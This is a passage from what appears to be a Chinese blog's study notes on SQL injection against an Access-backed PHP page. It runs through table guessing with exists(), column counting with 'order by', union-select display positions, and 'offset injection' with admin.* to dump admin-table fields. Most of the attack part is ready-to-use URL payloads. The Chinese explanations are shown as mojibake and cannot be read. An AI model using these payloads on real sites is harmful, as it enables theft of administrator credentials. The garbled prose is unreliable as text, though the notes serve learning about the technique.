exists(selct * from admin);</span><br></pre></td></tr></table></figure><p>æ¥çŒœæµ‹æ˜¯å¦æœ‰adminè¡¨ï¼Œå¦‚æœè¯´å­˜åœ¨çš„è¯é¡µé¢å°±ä¼šæ˜¾ç¤ºæ­£å¸¸ã€‚</p><p>existså‡½æ•°çš„ç”¨æ³•ï¼šEXISTSç”¨äºæ£€æŸ¥å­æŸ¥è¯¢æ˜¯å¦è‡³å°‘ä¼šè¿”å›ä¸€è¡Œæ•°æ®ï¼Œè¯¥å­æŸ¥è¯¢å®é™…ä¸Šå¹¶ä¸è¿”å›ä»»ä½•æ•°æ®ï¼Œè€Œæ˜¯è¿”å›å€¼Trueæˆ–False</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œaccessæ•°æ®åº“è”åˆæŸ¥è¯¢åé¢æ˜¯å¿…é¡»fromä¸€ä¸ªè¡¨åï¼Œå¦‚æœä¸çŸ¥é“è¡¨åï¼Œå°±ç›´æ¥ç”¨adminè¡¨ï¼Œaccessæ•°æ®åº“åŸºæœ¬ä¸Šæœ‰è¿™ä¸ªè¡¨ã€‚</p><ul><li><strong>åˆ¤æ–­å­—æ®µæ•°ï¼š</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 27  //é”™è¯¯æ˜¾ç¤º</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 26 //æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p>è¯´æ˜å­—æ®µä¸º26ä¸ªå­—æ®µ</p><ul><li><strong>è”åˆæŸ¥è¯¢çˆ†å‡ºæ˜¾ç¤ºä½</strong>:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¾ç¤ºä½æ˜¯2ï¼Œ5ï¼Œ7ï¼›</p><ul><li><strong>å¼€å§‹åç§»è¿›è¡Œæ³¨å…¥</strong></li></ul><p>åœ¨è¿™é‡Œæˆ‘ä»¬é€šè¿‡admin.*æ¥è¡¨ç¤ºadminè¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µï¼›</p><ul><li>adminè¡¨ä¸‹æ‰€å­˜åœ¨å­—æ®µæ•°ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.* from admin</span><br></pre></td></tr></table></figure><p> æ˜¾ç¤ºé”™è¯¯ï¼Œè¯´æ˜adminè¡¨ä¸‹å­—æ®µä¸æ­¢ä¸€ä¸ªï¼Œç»§ç»­æµ‹è¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.* from admin</span><br></pre></td></tr></table></figure><p>æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜adminä¸‹å­—æ®µæœ‰8ä¸ª;</p><ul><li>æˆ‘ä»¬åœ¨é€šè¿‡åç§»è¿›è¡Œçˆ†å‡ºå­—æ®µå†…å®¹ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,admin.*,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>é€šè¿‡åç§»åˆ°æ˜¾ç¤ºä½ï¼ŒæŸ¥çœ‹å­—æ®µå†…å®¹ï¼Œå¦‚æƒ³ç»§ç»­çœ‹å…¶ä»–å­—æ®µå¯ç»§ç»­åç§»ï¼›</p><p>ï¼ˆè¿™é‡Œè®°å½•çš„ä¸€åˆ‡åªä»£è¡¨æˆ‘å­¦ä¹ çš„ç¬”è®°,ä¸ä¸€å®šå…¨éƒ¨æ­£ç¡®ï¼Œå¦‚æœæœ‰é”™è¯¯ä¹‹å¤„è¿˜æœ›æŒ‡æ­£ï¼ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
